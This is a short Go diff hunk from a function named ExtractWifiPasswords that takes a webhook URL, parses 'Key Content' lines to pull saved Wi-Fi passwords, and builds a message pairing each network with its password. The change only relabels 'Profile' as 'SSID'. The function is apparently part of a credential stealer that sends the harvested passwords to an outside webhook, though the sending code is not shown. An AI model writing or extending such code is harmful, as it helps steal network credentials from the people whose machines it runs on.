@@ -70,7 +70,7 @@ func ExtractWifiPasswords(webhookURL string) {
 				for _, line := range lines {
 					if strings.Contains(line, "Key Content") {
 						password := strings.TrimSpace(strings.Split(line, ":")[1])
-						message += fmt.Sprintf("Profile: %s\nPassword: %s\n\n", profileName, password)
+						message += fmt.Sprintf("SSID: %s\nPassword: %s\n\n", profileName, password)
 					}
 				}
 			} else {
